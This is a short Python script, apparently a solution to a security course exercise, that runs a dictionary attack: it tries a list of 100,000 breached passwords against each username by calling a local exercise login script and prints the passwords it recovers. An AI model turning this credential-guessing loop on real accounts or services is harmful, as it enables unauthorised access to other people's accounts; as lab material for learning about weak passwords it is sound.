import sys
import subprocess
from datetime import datetime
from pathlib import Path

Q_NUM = 3
Q_DIR = Path(f"Q{Q_NUM}")

def get_usernames_passwords():
    with open(Q_DIR / "gang", "r") as f:
        usernames = f.read().split()
    with open(Q_DIR / "PwnedPWs100k", "r") as f:
        passwords = f.read().split()
    return usernames, passwords

def get_login_script():
    if (len(sys.argv) > 1) and (sys.argv[1] == "--mock"):
        login_script = Path("Solutions/MockLogin.py")
    else:
        login_script = Q_DIR / "Login.pyc"
    assert login_script.exists(), f"Login script {login_script} does not exist."
    return login_script

def try_passwords(username, passwords, login_script):
    for i, password in enumerate(passwords):
        output = subprocess.run(["python3", login_script, username, password], capture_output=True, text=True)
        if "Login successful" in output.stdout:
            return password
        
        if (i % 100 == 0) or (i == len(passwords) - 1):
            print(f"\r{str(i):5s} / {len(passwords)}   ", end="")

if __name__ == "__main__":
    usernames, passwords = get_usernames_passwords()

    login_script = get_login_script()
    print(f"Using login script: {login_script}\n")

    print(f"Start time: {datetime.now()}\n")

    for username in usernames:
        password = try_passwords(username, passwords, login_script)

        print(f"{username:25s}", end="")
        if password is None:
            print("FAILED")
        else:
            print(password)
            if username not in ["SkyRedFalcon914", "StarGreenBear981"]:  # Already found these.
                break

    print(f"\nEnd time: {datetime.now()}")
